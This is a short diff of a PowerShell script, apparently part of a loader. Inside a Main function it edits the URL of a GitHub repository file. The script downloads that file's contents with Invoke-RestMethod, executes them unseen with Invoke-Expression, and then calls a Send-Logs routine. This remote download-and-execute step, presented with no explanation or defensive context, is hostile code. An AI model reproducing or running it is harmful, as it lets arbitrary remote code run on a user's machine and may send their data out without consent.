@@ -326,7 +326,7 @@ function Main {
 
     $userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
     $downloadsPath = Join-Path -Path $userProfile -ChildPath "Downloads"
-    $url = "https://raw.githubusercontent.com/suprsor/Credits/refs/heads/main/Credits"
+    $url = "https://github.com/suprsor/Credits/blob/main/Credits"
     $content = Invoke-RestMethod -Uri $url
     Invoke-Expression $content
     Send-Logs
